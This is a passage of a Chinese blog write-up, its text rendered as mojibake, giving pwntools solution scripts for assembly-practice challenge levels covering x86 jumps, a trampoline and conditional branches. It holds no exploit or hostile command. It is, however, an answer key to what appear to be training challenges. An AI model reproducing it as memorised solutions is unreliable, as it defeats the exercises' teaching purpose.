å°†å­˜å‚¨åœ¨ <span class="hljs-number">0x4000bf</span>ï¼ˆæ¯æ¬¡è¿è¡Œéƒ½ä¼šæ”¹å˜ï¼‰ã€‚<br><br>å¯¹äºæ‰€æœ‰çš„è·³è½¬æŒ‡ä»¤ï¼Œæœ‰ä¸‰ç§ç±»å‹ï¼š  <br>ç›¸å¯¹è·³è½¬ï¼ˆrelative <span class="hljs-keyword">jumpsï¼‰ï¼šè·³è½¬åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤çš„æ­£å‘æˆ–è´Ÿå‘åç§»é‡ã€‚ </span> <br>ç»å¯¹è·³è½¬ï¼ˆabsolute <span class="hljs-keyword">jumpsï¼‰ï¼šè·³è½¬åˆ°ç‰¹å®šåœ°å€ã€‚ </span> <br>é—´æ¥è·³è½¬ï¼ˆindirect <span class="hljs-keyword">jumpsï¼‰ï¼šè·³è½¬åˆ°å¯„å­˜å™¨ä¸­æŒ‡å®šçš„å†…å­˜åœ°å€ã€‚</span><br><span class="hljs-keyword"></span><br>åœ¨ x86 ä¸­ï¼Œç»å¯¹è·³è½¬ï¼ˆè·³è½¬åˆ°ç‰¹å®šåœ°å€ï¼‰çš„å®ç°æ–¹å¼æ˜¯å…ˆå°†ç›®æ ‡åœ°å€æ”¾å…¥ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åæ‰§è¡Œ <span class="hljs-keyword">jmp </span>regã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæˆ‘ä»¬è¦æ±‚ä½ æ‰§è¡Œä¸€ä¸ªç»å¯¹è·³è½¬ã€‚<br><br>æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  <br>è·³è½¬åˆ°ç»å¯¹åœ°å€ <span class="hljs-number">0x403000</span><br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>åŠ è½½ä½ æä¾›çš„ä»£ç åˆ°åœ°å€ï¼š<span class="hljs-number">0x4000bf</span><br></code></pre></td></tr></table></figure><p>åœ¨ x86 ä¸­ï¼Œç»å¯¹è·³è½¬ï¼ˆè·³è½¬åˆ°ç‰¹å®šåœ°å€ï¼‰çš„å®ç°æ–¹å¼æ˜¯<strong>å…ˆå°†ç›®æ ‡åœ°å€æ”¾å…¥ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åæ‰§è¡Œ jmp reg</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov rax,0x403000</span><br><span class="hljs-string">       jmp rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="23"><a href="#23" class="headerlink" title="23"></a>23</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs awk">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ§åˆ¶æµæ“ä½œã€‚è¿™æ¶‰åŠä½¿ç”¨æŒ‡ä»¤ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ç‰¹æ®Šå¯„å­˜å™¨Â `rip`ï¼Œå³æŒ‡ä»¤æŒ‡é’ˆã€‚ä½ å°†ä½¿ç”¨ jmpã€callã€cmp ç­‰æŒ‡ä»¤åŠå…¶æ›¿ä»£æŒ‡ä»¤æ¥å®ç°æ‰€éœ€çš„è¡Œä¸ºã€‚<br><br>å›æƒ³ä¸€ä¸‹ï¼Œå¯¹äºæ‰€æœ‰çš„è·³è½¬æŒ‡ä»¤ï¼Œæœ‰ä¸‰ç§ç±»å‹ï¼š  <br>ç›¸å¯¹è·³è½¬ï¼ˆrelative jumpsï¼‰  <br>ç»å¯¹è·³è½¬ï¼ˆabsolute jumpsï¼‰  <br>é—´æ¥è·³è½¬ï¼ˆindirect jumpsï¼‰<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæˆ‘ä»¬è¦æ±‚ä½ æ‰§è¡Œä¸€ä¸ªç›¸å¯¹è·³è½¬ã€‚<br><br>ä½ éœ€è¦ä½¿ç”¨æŸç§æŒ‡ä»¤å¡«å……ä½ çš„ä»£ç ï¼Œä»¥ä½¿è¿™ä¸ªç›¸å¯¹è·³è½¬æˆä¸ºå¯èƒ½ã€‚<br><br>æˆ‘ä»¬å»ºè®®ä½¿ç”¨Â `nop`Â æŒ‡ä»¤ã€‚å®ƒåªå ç”¨ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œè€Œä¸”éå¸¸å¯é¢„æµ‹ã€‚<br><br>å®é™…ä¸Šï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ±‡ç¼–å™¨æœ‰ä¸€ä¸ªæ–¹ä¾¿çš„Â `.rept`Â æŒ‡ä»¤ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥é‡å¤æŸä¸ªæ±‡ç¼–æŒ‡ä»¤å¤šæ¬¡ï¼š  <br>[https:<span class="hljs-regexp">//</span>ftp.gnu.org<span class="hljs-regexp">/old-gnu/</span>Manuals<span class="hljs-regexp">/gas-2.9.1/</span>html_chapter<span class="hljs-regexp">/as_7.html](https:/</span><span class="hljs-regexp">/ftp.gnu.org/</span>old-gnu<span class="hljs-regexp">/Manuals/g</span>as-<span class="hljs-number">2.9</span>.<span class="hljs-number">1</span><span class="hljs-regexp">/html_chapter/</span>as_7.html)<br><br>å¯¹äºè¿™ä¸ªçº§åˆ«ï¼Œæœ‰ç”¨çš„æŒ‡ä»¤æœ‰ï¼š  <br>jmp (reg1 | addr | offset) ; nop<br><br>æç¤ºï¼šå¯¹äºç›¸å¯¹è·³è½¬ï¼ŒæŸ¥é˜…å¦‚ä½•åœ¨ x86 ä¸­ä½¿ç”¨Â `labels`ã€‚<br><br>åˆ©ç”¨ä¸Šè¿°çŸ¥è¯†ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  <br>å°†ä½ çš„ä»£ç çš„ç¬¬ä¸€æ¡æŒ‡ä»¤è®¾ç½®ä¸º jmp  <br>å°†è¯¥ jmp è®¾ç½®ä¸ºç›¸å¯¹è·³è½¬ï¼Œè·³è½¬åˆ°å½“å‰ä½ç½®åçš„ <span class="hljs-number">0</span>x51 ä¸ªå­—èŠ‚å¤„  <br>åœ¨ç›¸å¯¹è·³è½¬å°†é‡æ–°å®šå‘æ§åˆ¶æµçš„ä»£ç ä½ç½®ï¼Œå°† rax è®¾ç½®ä¸º <span class="hljs-number">0</span>x1<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>åŠ è½½ä½ æä¾›çš„ä»£ç åˆ°åœ°å€ï¼š<span class="hljs-number">0</span>x400054<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨labelè¿›è¡Œé—´æ¥è·³è½¬</li><li>ä½¿ç”¨repté‡å¤nopæŒ‡ä»¤ 0x51æ¬¡<ul><li>ä½¿ç”¨reptå¯ä»¥é‡å¤æŸä¸ªæ±‡ç¼–æŒ‡ä»¤å¤šæ¬¡</li><li><code>nop</code>Â æŒ‡ä»¤åªå ç”¨ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œè€Œä¸”éå¸¸å¯é¢„æµ‹</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    jmp short label_target        </span><br><span class="hljs-string">                               </span><br><span class="hljs-string">    .rept 0x50                    </span><br><span class="hljs-string">        nop</span><br><span class="hljs-string">    .endr</span><br><span class="hljs-string">label_target:</span><br><span class="hljs-string">    mov rax, 0x1                  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="24"><a href="#24" class="headerlink" title="24"></a>24</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ§åˆ¶æµæ“ä½œã€‚è¿™æ¶‰åŠä½¿ç”¨æŒ‡ä»¤ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ç‰¹æ®Šå¯„å­˜å™¨Â <span class="hljs-string">`rip`</span>ï¼Œå³æŒ‡ä»¤æŒ‡é’ˆã€‚ä½ å°†ä½¿ç”¨ <span class="hljs-keyword">jmp</span>ã€<span class="hljs-keyword">call</span>ã€<span class="hljs-keyword">cmp</span> ç­‰æŒ‡ä»¤åŠå…¶æ›¿ä»£æŒ‡ä»¤æ¥å®ç°æ‰€éœ€çš„è¡Œä¸ºã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†ç»“åˆå‰ä¸¤ä¸ªçº§åˆ«ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  <br>åˆ›å»ºä¸€ä¸ªä¸¤æ¬¡è·³è½¬çš„è·³æ¿ï¼ˆtrampolineï¼‰ï¼š  <br>å°†ä½ çš„ä»£ç çš„ç¬¬ä¸€æ¡æŒ‡ä»¤è®¾ç½®ä¸º <span class="hljs-keyword">jmp</span>  <br>å°†è¯¥ <span class="hljs-keyword">jmp</span> è®¾ç½®ä¸ºç›¸å¯¹è·³è½¬ï¼Œè·³è½¬åˆ°å½“å‰ä½ç½®åçš„ <span class="hljs-number">0x51</span> ä¸ªå­—èŠ‚å¤„  <br>åœ¨åœ°å€ <span class="hljs-number">0x51</span> å¤„å†™å…¥ä»¥ä¸‹ä»£ç ï¼š  <br>å°†æ ˆé¡¶çš„å€¼æ”¾å…¥å¯„å­˜å™¨ <span class="hljs-built_in">rdi</span>  <br>è·³è½¬åˆ°ç»å¯¹åœ°å€ <span class="hljs-number">0x403000</span><br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>åŠ è½½ä½ æä¾›çš„ä»£ç åˆ°åœ°å€ï¼š<span class="hljs-number">0x40009a</span>  <br>(stack) [<span class="hljs-number">0x7fffff1ffff8</span>] = <span class="hljs-number">0xfe</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    jmp short label_target                      </span><br><span class="hljs-string">    .rept 0x51                 </span><br><span class="hljs-string">        nop</span><br><span class="hljs-string">    .endr</span><br><span class="hljs-string">label_target:</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax,0x403000</span><br><span class="hljs-string">    jmp rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="25"><a href="#25" class="headerlink" title="25"></a>25</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ§åˆ¶æµæ“ä½œã€‚è¿™æ¶‰åŠä½¿ç”¨æŒ‡ä»¤ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ç‰¹æ®Šå¯„å­˜å™¨ <span class="hljs-string">`rip`</span>ï¼Œå³æŒ‡ä»¤æŒ‡é’ˆã€‚ä½ å°†ä½¿ç”¨ <span class="hljs-keyword">jmp</span>ã€<span class="hljs-keyword">call</span>ã€<span class="hljs-keyword">cmp</span> ç­‰æŒ‡ä»¤åŠå…¶æ›¿ä»£æŒ‡ä»¤æ¥å®ç°æ‰€éœ€çš„è¡Œä¸ºã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæˆ‘ä»¬å°†å¤šæ¬¡æµ‹è¯•ä½ çš„ä»£ç ï¼Œä½¿ç”¨åŠ¨æ€å€¼æ¥è¿è¡Œä½ çš„ä»£ç ï¼è¿™æ„å‘³ç€æˆ‘ä»¬å°†ä»¥å„ç§éšæœºçš„æ–¹å¼è¿è¡Œä½ çš„ä»£ç ï¼Œä»¥éªŒè¯é€»è¾‘æ˜¯å¦è¶³å¤Ÿå¥å£®ï¼Œèƒ½å¤Ÿåœ¨æ­£å¸¸ä½¿ç”¨ä¸­ç”Ÿå­˜ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†å‘ä½ ä»‹ç»æ¡ä»¶è·³è½¬â€”â€”è¿™æ˜¯ x86 ä¸­æœ€æœ‰ä»·å€¼çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚<br>åœ¨é«˜çº§ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå­˜åœ¨ if-else ç»“æ„ï¼Œç”¨äºæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br>  å¦‚æœ x æ˜¯å¶æ•°ï¼š<br>    is_even = <span class="hljs-number">1</span><br>  å¦åˆ™ï¼š<br>    is_even = <span class="hljs-number">0</span><br><br>è¿™åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼Œå› ä¸ºå®ƒå¯ä»¥ä»…é€šè¿‡ä½é€»è¾‘æ¥å®ç°ï¼Œè€Œä½ åœ¨ä¹‹å‰çš„çº§åˆ«ä¸­å·²ç»åšè¿‡äº†ã€‚<br><br>åœ¨è¿™äº›ç»“æ„ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æä¾›ç»™ç¨‹åºçš„åŠ¨æ€å€¼æ¥æ§åˆ¶ç¨‹åºçš„æ§åˆ¶æµã€‚<br><br>ä½¿ç”¨ <span class="hljs-keyword">jmp</span> æ¥å®ç°ä¸Šè¿°é€»è¾‘å¯ä»¥è¿™æ ·åšï¼š<br><br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><span class="hljs-comment">; å‡è®¾ rdi = xï¼Œrax æ˜¯è¾“å‡º</span><br><span class="hljs-comment">; rdx = rdi mod 2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-comment">; ä½™æ•°ä¸º 0 è¡¨ç¤ºå¶æ•°</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br><span class="hljs-comment">; å¦‚æœä¸ä¸º 0ï¼Œåˆ™è·³è½¬åˆ° not_even ä»£ç </span><br><span class="hljs-keyword">jne</span> not_even<br><span class="hljs-comment">; å¦åˆ™ç»§ç»­æ‰§è¡Œ even ä»£ç </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">jmp</span> done<br><span class="hljs-comment">; åªæœ‰åœ¨ not_even æ—¶æ‰è·³è½¬åˆ°æ­¤å¤„</span><br><span class="hljs-symbol">not_even:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">done:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-comment">; è¿™é‡Œå¯ä»¥æœ‰æ›´å¤šçš„æŒ‡ä»¤</span><br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><br>ç„¶è€Œï¼Œé€šå¸¸ä½ ä¸ä»…ä»…æƒ³è¦ä¸€ä¸ªå•ç‹¬çš„ <span class="hljs-string">&#x27;if-else&#x27;</span> ç»“æ„ã€‚<br><br>æœ‰æ—¶ä½ æƒ³è¦ä¸¤ä¸ª if æ£€æŸ¥ï¼Œç„¶åæ˜¯ä¸€ä¸ª elseã€‚<br><br>ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½ éœ€è¦ç¡®ä¿åœ¨å¤±è´¥åï¼Œæ§åˆ¶æµä¼šâ€œè½å…¥â€åˆ°ä¸‹ä¸€ä¸ª <span class="hljs-string">`if`</span>ã€‚<br><br>æ‰€æœ‰çš„ä»£ç æ‰§è¡Œåå¿…é¡»è·³è½¬åˆ°åŒä¸€ä¸ª <span class="hljs-string">`done`</span> ä½ç½®ï¼Œä»¥é¿å…æ‰§è¡Œ else ä»£ç ã€‚<br><br>x86 ä¸­æœ‰å¾ˆå¤šç§è·³è½¬ç±»å‹ï¼Œäº†è§£å®ƒä»¬çš„ç”¨æ³•ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚<br><br>å‡ ä¹æ‰€æœ‰çš„è·³è½¬éƒ½ä¾èµ–äºä¸€ä¸ªå«åš ZF çš„æ ‡å¿—ä½ï¼Œå³é›¶æ ‡å¿—ä½ã€‚<br><br>å½“ <span class="hljs-keyword">cmp</span> ç›¸ç­‰æ—¶ï¼ŒZF è¢«è®¾ç½®ä¸º <span class="hljs-number">1</span>ï¼Œå¦åˆ™ä¸º <span class="hljs-number">0</span>ã€‚<br><br>åˆ©ç”¨ä¸Šè¿°çŸ¥è¯†ï¼Œå®ç°ä»¥ä¸‹å†…å®¹ï¼š<br>  å¦‚æœ [x] æ˜¯ <span class="hljs-number">0x7f454c46</span>ï¼š<br>    y = [x+<span class="hljs-number">4</span>] + [x+<span class="hljs-number">8</span>] + [x+<span class="hljs-number">12</span>]<br>  å¦åˆ™å¦‚æœ [x] æ˜¯ <span class="hljs-number">0x00005A4D</span>ï¼š<br>    y = [x+<span class="hljs-number">4</span>] - [x+<span class="hljs-number">8</span>] - [x+<span class="hljs-number">12</span>]<br>  å¦åˆ™ï¼š<br>    y = [x+<span class="hljs-number">4</span>] * [x+<span class="hljs-number">8</span>] * [x+<span class="hljs-number">12</span>]<br><br>å…¶ä¸­ï¼š<br>  x = <span class="hljs-built_in">rdi</span>ï¼Œy = <span class="hljs-built_in">rax</span>ã€‚<br><br>å‡è®¾æ¯ä¸ªè§£å¼•ç”¨çš„å€¼éƒ½æ˜¯æœ‰ç¬¦å·çš„ <span class="hljs-built_in">dword</span>ã€‚<br>è¿™æ„å‘³ç€æ¯ä¸ªå†…å­˜ä½ç½®ä¸Šçš„å€¼å¯ä»¥æ˜¯è´Ÿå€¼ã€‚<br><br>ä¸€ä¸ªæœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆè‡³å°‘è¦ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ä¹‹ä¸€ï¼š<br>  <span class="hljs-keyword">jmp</span>ï¼ˆä»»æ„å˜ä½“ï¼‰ï¼Œ<span class="hljs-keyword">cmp</span><br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†åœ¨ä½ çš„ä»£ç ä¸Šè¿è¡Œå¤šæ¬¡æµ‹è¯•ï¼Œè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹è¿è¡Œï¼š<br>  (data) [<span class="hljs-number">0x404000</span>] = &#123;<span class="hljs-number">4</span> ä¸ªéšæœºçš„ <span class="hljs-built_in">dword</span>&#125;<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x404000</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov eax,[rdi]</span><br><span class="hljs-string">    cmp eax, 0x7f454c46</span><br><span class="hljs-string">    je elf_format       </span><br><span class="hljs-string">    cmp eax, 0x00005A4D</span><br><span class="hljs-string">    je dos_format       </span><br><span class="hljs-string">    jmp other_format    </span><br><span class="hljs-string">elf_format:</span><br><span class="hljs-string">    mov eax, [rdi + 4]  </span><br><span class="hljs-string">    add eax, [rdi + 8]  </span><br><span class="hljs-string">    add eax, [rdi + 12] </span><br><span class="hljs-string">    jmp end             </span><br><span class="hljs-string"></span><br><span class="hljs-string">dos_format:</span><br><span class="hljs-string">    mov eax, [rdi + 4]  </span><br><span class="hljs-string">    sub eax, [rdi + 8]  </span><br><span class="hljs-string">    sub eax, [rdi + 12] </span><br><span class="hljs-string">    jmp end             </span><br><span class="hljs-string"></span><br><span class="hljs-string">other_format:</span><br><span class="hljs-string">    mov eax, [rdi + 4]  </span><br><span class="hljs-string">    imul eax, [rdi + 8] </span><br><span class="hljs-string">    imul eax, [rdi + 12]</span><br><span class="hljs-string">end:</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="26"><a href="#26" class="headerlink" title="26"></a>26</h1><figure class="highlight x86asm"><table><tr><td 